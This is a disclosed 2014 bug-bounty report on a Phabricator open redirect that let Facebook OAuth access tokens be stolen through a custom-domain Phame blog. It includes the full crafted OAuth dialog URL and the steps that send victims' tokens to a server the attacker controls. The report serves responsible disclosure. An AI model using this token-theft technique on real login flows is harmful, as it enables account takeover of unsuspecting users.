---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '3596'
original_report_id: '3596'
title: OAuth access_token stealing in Phabricator
weakness: Open Redirect
team_handle: phabricator
created_at: '2014-03-10T12:03:49.078Z'
disclosed_at: '2014-04-11T14:23:15.622Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 4
tags:
- hackerone
- open-redirect
---

# OAuth access_token stealing in Phabricator

## Metadata

- HackerOne Report ID: 3596
- Weakness: Open Redirect
- Program: phabricator
- Disclosed At: 2014-04-11T14:23:15.622Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi,

I found that an attacker is able to steal access_tokens of facebook users via Phabricator App (184510521580034).

when users login to phabricator, they can choose to login via Facebook (https://secure.phabricator.com/login/) attaching pic, In this case an attacker is able to exploit this behavior to steal facebook access_tokens via phabricator app.

Full Reproduce, Exploit:

1. Create a blog on phabricator https://secure.phabricator.com/phame/blog/new/
and provide a custom domain, in this case: files.nirgoldshlager.com

2. send a malicious link to the victim: https://www.facebook.com/dialog/oauth?client_id=184510521580034&response_type=token&redirect_uri=https://secure.phabricator.com/phame/live/47/ , Click Continue

when the victim will click continue, his access token will be send to my malicious server, saved in a log file under: http://files.nirgoldshlager.com

PoC Video:

https://drive.google.com/file/d/0B2-5ltUODX1LWHV6R3gxSFAwNzQ/edit?usp=sharing

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
